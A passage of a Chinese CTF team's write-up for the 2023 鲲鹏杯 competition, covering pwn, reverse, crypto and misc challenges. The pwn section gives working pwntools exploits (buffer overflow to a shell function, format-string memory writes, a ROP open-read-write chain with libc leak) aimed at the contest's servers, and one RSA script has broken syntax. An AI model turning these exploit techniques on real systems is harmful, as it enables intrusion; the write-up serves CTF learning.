        <h2 id="signin-for-pwn1-wulala11">
          <a href="#signin-for-pwn1-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#signin-for-pwn1-wulala11" class="headerlink" title="signin_for_pwn1 @wulala11"></a>signin_for_pwn1 @wulala11</h2>
      <p><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/34.png"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/35.png"><br>read(0, buf, v8);<br>通过这个可以跳转到gen_shell从而得到flag2<br>v5输入-1，可以绕过判断，并且在给unsigned__int8 v8赋值时，由于v8是无符号数，所以v8会是一个很大的数。<br>flag1直接输入3到8之内的数就可以得到。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/36.png"><br>Exp:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10001)</span><br><span class="line">sh=0x4006D7</span><br><span class="line">payload=b&#x27;a&#x27;*13+p64(0)+p64(sh)</span><br><span class="line">io.sendline(str(-1))</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendlineafter(&#x27;good!&#x27;,str(6))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="bs-wulala11">
          <a href="#bs-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#bs-wulala11" class="headerlink" title="bs @wulala11"></a>bs @wulala11</h2>
      <p><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/37.png"><br>格式化字符串漏洞改大数和小数。<br>用到了pwntools的一个工具fmtstr_payload，可以实现修改任意内存<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/38.png"><br>格式化字符串找出偏移是8<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/39.png"><br>套上去fmtstr_payload(offset,{原地址：目的地址})<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/40.png"><br>Exp:</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./bs&#x27;)</span><br><span class="line">io=remote(&#x27;43.143.224.232&#x27;,10000)</span><br><span class="line">offset=8</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601060:305419896&#125;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=fmtstr_payload(offset,&#123;0x601058:2&#125;)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="Limited-sginup-wulala11-未完成">
          <a href="#Limited-sginup-wulala11-未完成" class="heading-link"><i class="fas fa-link"></i></a><a href="#Limited-sginup-wulala11-未完成" class="headerlink" title="Limited_sginup @wulala11(未完成) "></a>Limited_sginup @wulala11(未完成) </h2>
      <p>格式化字符串找不到偏移。<br>开了59号沙箱，用orw方法。<br>Exp：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)</span><br><span class="line">#io=process(&#x27;./limited_signup&#x27;)</span><br><span class="line">io=remote(&#x27;pwn.detectivelfy.top&#x27;,10009)</span><br><span class="line">libc=ELF(&#x27;libc-2.27.so&#x27;)</span><br><span class="line">bss=0x202160</span><br><span class="line">leave_ret=0x000c7d</span><br><span class="line">io.sendlineafter(&#x27;Your username: &#x27;,&#x27;%p%31$p&#x27;)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">stack=int(io.recv(12),16)</span><br><span class="line">io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">libc_base=int(io.recv(12),16)-128-libc.symbols[&#x27;__libc_start_main&#x27;]</span><br><span class="line">log.info(hex(stack))</span><br><span class="line">log.info(hex(libc_base))</span><br><span class="line">openn=libc_base+libc.symbols[&#x27;open&#x27;]</span><br><span class="line">read=libc_base+libc.symbols[&#x27;read&#x27;]</span><br><span class="line">write=libc_base+libc.symbols[&#x27;write&#x27;]</span><br><span class="line">pop_rdi_ret=libc_base+0x000000000002164f</span><br><span class="line">pop_rsi_ret=libc_base+0x0000000000023a6a</span><br><span class="line">pop_rdx_ret=libc_base+0x0000000000001b96</span><br><span class="line">payload=p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_ret)+p64(bss)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(bss)+p64(pop_rsi_ret)+p64(0)+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(3)+p64(pop_rsi_ret)+p64(bss+0x10)+p64(pop_rdx_ret)+p64(0x100)+p64(read)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(1)+p64(write)</span><br><span class="line">payload+=b&#x27;\0&#x27;*(192-len(payload))</span><br><span class="line">payload+=p64(stack+8)+p64(leave_ret)</span><br><span class="line">io.sendlineafter(&#x27;password(0-8 chars): &#x27;,payload)</span><br><span class="line">io.send(&#x27;./flag\x00&#x27;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="REVERSE">
          <a href="#REVERSE" class="heading-link"><i class="fas fa-link"></i></a><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2>
      
        <h2 id="signin-for-reverse-wulala11">
          <a href="#signin-for-reverse-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#signin-for-reverse-wulala11" class="headerlink" title="signin_for_reverse @wulala11"></a>signin_for_reverse @wulala11</h2>
      <p>无壳，直接拖到ida分析。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/41.png"><br>注意str_len不是计算长度，是一个函数。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/42.png"><br>所以sss到flag经过4个步骤。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/43.png"><br>这些是sss<br>exp:<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/44.png"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/45.png"></p>
<p>INTIME @wulala11<br>手搓大法好！！！！只要在60.5秒时按回车就行，是不是很简单(<br>忘记把搓出来的flag截出来了。<br>手搓的时候可以开多些程序。<br>比较有意思的是这题的hint<br>应该代表三种解法吧。<br>要么在60.05秒按enter（手搓）<br>要么让你的enter按在60.05秒（写脚本控制按回车的时间）<br>要么让你按enter的时间是60.05秒（外挂方法更改时间？）<br>Baby4 @wulala11<br>掺杂私货的rc4加密。<br>有upx壳，脱壳后拉入ida分析。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/46.png"><br>看出来应该是rc4加密，直接找了个脚本套进去发现不行，仔细看源码发现多了个+2.<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/47.png"><br>只要在自己的脚本上同样加上2就行。<br>不过待加密的字符串有0到40个，使用越界到v5，把v5的^G也加密了。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/48.png"><br>exp:<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/49.png"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/50.png"></p>

        <h2 id="do-some-shop-wulala11">
          <a href="#do-some-shop-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#do-some-shop-wulala11" class="headerlink" title="do some shop @wulala11"></a>do some shop @wulala11</h2>
      <p>是pyd后缀的文件，没见过，长见识了。<br>运行后，发现是一个运气（dubo）游戏,赚到10000块能买flag。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/51.png"><br>拿到10000块后发现买到的flag是假的。只能找别的方法了。<br>这个指令可以查看pyd文件可调用的函数。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/52.png"><br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/53.png"><br>Functions部分为可以被调用的函数。试了一遍，发现调用hidden_func()后，这个应该是flag了。<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/54.png"><br>运行后出现的意思大概是给出1到999999随机数，他会和box里一个永远不变的数对比，所以爆破。<br>在functions里面也给出了check_box函数，所以直接对它进行爆破.<br>exp:<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/55.png"><br>成功得到flag<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/56.png"></p>

        <h2 id="Crypto">
          <a href="#Crypto" class="heading-link"><i class="fas fa-link"></i></a><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2>
      
        <h2 id="Sign-in-crypto-抓到一只梗">
          <a href="#Sign-in-crypto-抓到一只梗" class="heading-link"><i class="fas fa-link"></i></a><a href="#Sign-in-crypto-抓到一只梗" class="headerlink" title="Sign_in_crypto@抓到一只梗"></a>Sign_in_crypto@抓到一只梗</h2>
      <p><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/58.png"><br>一道签到题，根据题目提示宝可梦可以知道，这是宝可梦密码，上网搜就可以得出宝可梦密码的解码，<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/59.png"><br>得到flag.</p>
<p>ezRSA@抓到一只梗<br>解这道题目一开始的想法是使用yafu爆破，但是爆不出来，于是上网寻找可用的脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">import gmpy2</span><br><span class="line">n= 3236867178218679187868029646892933356668889556382011928931225322431621251105796733385018298761628469280142713309248860743887753630408491233303470524581613046343636088484158092652882951923670524296993511353840564656766994225173007360640103570566638806180184959757870406871812720700594904021996547594565066882804691828543299539337010519084333847755117116787362005939302948402903905623518264313102119905721536088249427758592469745889752091253811391842747472098790497930465697244274062411355931577264845617796944760253492223999560984878801597529157991970452444730464415892572521076657560540469036918936424167738129292149337</span><br><span class="line"></span><br><span class="line">pp = n*13//25</span><br><span class="line">p= gmpy2.iroot(pp,2)</span><br><span class="line">floating_rng=1000</span><br><span class="line">for i in range(p[0]-floating_rng, p[0]+floating_rng):</span><br><span class="line">    q = divmod(n,i)</span><br><span class="line">if q[1]==0</span><br><span class="line">print(&quot;p等于：&quot;,i,&quot;\nq等于：&quot;,q[0])</span><br></pre></td></tr></table></div></figure>
<p>上述脚本是在当p和q存在一定的联系的时候可以使用，用这种方式可以得到q和p，得到p，q之后就是按照常规的方式解，但是注意这里的e和phi并不是互素的，因此脚本为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import libnum</span><br><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">n= 3236867178218679187868029646892933356668889556382011928931225322431621251105796733385018298761628469280142713309248860743887753630408491233303470524581613046343636088484158092652882951923670524296993511353840564656766994225173007360640103570566638806180184959757870406871812720700594904021996547594565066882804691828543299539337010519084333847755117116787362005939302948402903905623518264313102119905721536088249427758592469745889752091253811391842747472098790497930465697244274062411355931577264845617796944760253492223999560984878801597529157991970452444730464415892572521076657560540469036918936424167738129292149337</span><br><span class="line">c= 2339965778436142782052967535496505651474563341901632084917518756140138032224457771523421333427920797122535944769637611955628982190894007313191473758233828005078021535336575884902316956878839650389912698436365769491455170635123715961160639918113932688127559246884119595918813345785365034832162389477368415105417242954578169852883614129229395701884672152186597251881330231018065088602875448533721094910042307541136110718541953131935363639531139842692566928740644057019950055309767868009677200912814942125854492261659058850590048575269859609783886985895672932538550170475630973553415557191436049778982667830171880640885002</span><br><span class="line">p=1297370776869015644042912843750153481324894222765786757587689953465853934331943016049206102674763114705799927950605111210741080077091466734768799558821188873963569313247901618271456625890659712994791040916662327965685461393843316773546756339119668186481899689043854844710245358104030110967076587288184451338569</span><br><span class="line">q=2494943801671183930851755468750295156394027351472666841514788372049719104484505800094627120528390605203461399905009829251425153994406666797632306843886901680699171756245964650522031972866653294220752001762812169164779733449698686102974531421383977281695960940468951624442779534815442521090531898631123944880273</span><br><span class="line">#phi=(p-1)*(q-1)</span><br><span class="line">e=0xe18e</span><br><span class="line">#d = libnum.invmod(e,phi)</span><br><span class="line"></span><br><span class="line"># 当e约去公约数后与phi互素</span><br><span class="line">def decrypt(p, q, e, c):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - 1) * (q - 1)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = pow(c, d, n)</span><br><span class="line">    print(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    print(msg)</span><br><span class="line">    if msg[1]:</span><br><span class="line">        print(long_to_bytes(msg[0]))</span><br><span class="line"></span><br><span class="line">decrypt(p,q,e,c)</span><br></pre></td></tr></table></div></figure>
<p>这里还是借用师傅的脚本。得到flag{0f_CouRs3_Y0u_kN0w_7he_E@sy_RSA!}</p>

        <h2 id="Ezmath-抓到一只梗">
          <a href="#Ezmath-抓到一只梗" class="heading-link"><i class="fas fa-link"></i></a><a href="#Ezmath-抓到一只梗" class="headerlink" title="Ezmath@抓到一只梗"></a>Ezmath@抓到一只梗</h2>
      <p>很幸运利用搜索引擎找到了原题，只能说密码手特别需要具备这项技能，作为密码手水平还有待提高，不多说，直接放上网上师傅的exp（又捡漏了一题）</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">p=24806834269359003282202902512783687710203582184828384138307070665433804609556323577714893596218908734611</span><br><span class="line">s1=14058579254368610608096465776494244168577103768054747907758469816862092340677345880760607937260906886618</span><br><span class="line">s2=4549079676331431556111756538670168728123411729424075104216718712311915417530961318066784845836058181317</span><br><span class="line">s3=1045978316664357359174911971933619844229184799622423723188472733324400296741795131979626839521616504900</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line"># s3-s2 = a(s2-s1) mod p</span><br><span class="line">t = invert(s2 - s1, p)</span><br><span class="line">a = (t * (s3 - s2)) % p</span><br><span class="line">#a = 25714049524051800625758372225598770398614533519595256157902456884372427008002817231382013589153912429484</span><br><span class="line"></span><br><span class="line"># s3 = a*s2 + b mod p</span><br><span class="line">b = (s3 - a * s2) % p</span><br><span class="line">#b = 10170297191068284996927402215696494489341479919496467043387273609973505047115652911086290426648313876559</span><br><span class="line"># s1 = a*s0 + b mod p</span><br><span class="line">a1 = invert(a, p)</span><br><span class="line">s0 = ((s1 - b) * a1) % p</span><br><span class="line">#s0 = 14337636555117933152506165016723944787939761429733562849369091223517166614830298165864272285381681301117</span><br><span class="line">bytes.fromhex(hex(s0)[2:])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(s0)[2:]))</span><br></pre></td></tr></table></div></figure>
<p>得到flag{e4syRsa1snotdifficult5996642D0A7415EF}</p>

        <h2 id="MISC">
          <a href="#MISC" class="heading-link"><i class="fas fa-link"></i></a><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2>
      
        <h2 id="Ezlog-抓到一只梗">
          <a href="#Ezlog-抓到一只梗" class="heading-link"><i class="fas fa-link"></i></a><a href="#Ezlog-抓到一只梗" class="headerlink" title="Ezlog@抓到一只梗"></a>Ezlog@抓到一只梗</h2>
      <p><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/60.png"><br>尝试了一下杂项，只能说太劝退了，看的眼睛难受，解题的关键在于后面的sql注入，利用时间盲注，在结合前面的时间波动，如果出现时间相同的，则说明字母正确，后来一个个查找，手搓出来flag{501ea7cf1544106e3555c4cc2cf4087}</p>

        <h2 id="Math-game-wulala11">
          <a href="#Math-game-wulala11" class="heading-link"><i class="fas fa-link"></i></a><a href="#Math-game-wulala11" class="headerlink" title="Math_game @wulala11"></a>Math_game @wulala11</h2>
      <p>数织游戏，找了个软件，直接把图片内容填进去，得到一个二维码，扫码获得flag.<br><img src="/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/57.png"></p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文結束，感謝您的閱讀 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文連結: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/">https://hyggevv.github.io/2023/04/25/2023%E9%B2%B2%E9%B9%8F%E6%9D%AFwp/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版權聲明: </span><span class="copyright-notice__value">本部落格所有文章除特別聲明外，均採用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 許可協議。轉載請注明出處！</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/05/01/%E5%88%9D%E6%8E%A2python-pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">初探pickle反序列化</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/04/20/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/"><span class="paginator-prev__text">序列化与反序列化之原生类和字符逃逸</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目錄</span><span class="sidebar-nav-ov">本站概覽</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">
          前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">
          解题情况：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">3.</span> <span class="toc-text">
          WEB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin-for-web-hey"><span class="toc-number">4.</span> <span class="toc-text">
          signin_for_web@hey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop-hey"><span class="toc-number">5.</span> <span class="toc-text">
          ezpop@hey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#realworld-js-hey"><span class="toc-number">6.</span> <span class="toc-text">
          realworld_js@hey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpentest-hey"><span class="toc-number">7.</span> <span class="toc-text">
          ezpentest@hey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FORENSICS"><span class="toc-number">8.</span> <span class="toc-text">
          FORENSICS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Signin-for-forensics-hey"><span class="toc-number">9.</span> <span class="toc-text">
          Signin_for_forensics@hey</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PWN"><span class="toc-number">10.</span> <span class="toc-text">
          PWN</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin-for-pwn1-wulala11"><span class="toc-number">11.</span> <span class="toc-text">
          signin_for_pwn1 @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bs-wulala11"><span class="toc-number">12.</span> <span class="toc-text">
          bs @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Limited-sginup-wulala11-%E6%9C%AA%E5%AE%8C%E6%88%90"><span class="toc-number">13.</span> <span class="toc-text">
          Limited_sginup @wulala11(未完成) </span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">14.</span> <span class="toc-text">
          REVERSE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#signin-for-reverse-wulala11"><span class="toc-number">15.</span> <span class="toc-text">
          signin_for_reverse @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#do-some-shop-wulala11"><span class="toc-number">16.</span> <span class="toc-text">
          do some shop @wulala11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">17.</span> <span class="toc-text">
          Crypto</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Sign-in-crypto-%E6%8A%93%E5%88%B0%E4%B8%80%E5%8F%AA%E6%A2%97"><span class="toc-number">18.</span> <span class="toc-text">
          Sign_in_crypto@抓到一只梗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezmath-%E6%8A%93%E5%88%B0%E4%B8%80%E5%8F%AA%E6%A2%97"><span class="toc-number">19.</span> <span class="toc-text">
          Ezmath@抓到一只梗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">20.</span> <span class="toc-text">
          MISC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ezlog-%E6%8A%93%E5%88%B0%E4%B8%80%E5%8F%AA%E6%A2%97"><span class="toc-number">21.</span> <span class="toc-text">
          Ezlog@抓到一只梗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Math-game-wulala11"><span class="toc-number">22.</span> <span class="toc-text">
          Math_game @wulala11</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">114</div><div class="sidebar-ov-state-item__name">歸檔</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">分類</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">標籤</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知識共享許可協議" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已閱讀了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2025</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 強力驅動</span><span> v5.4.2</span><span class="footer__devider">|</span><span>主題 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">總瀏覽次數</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>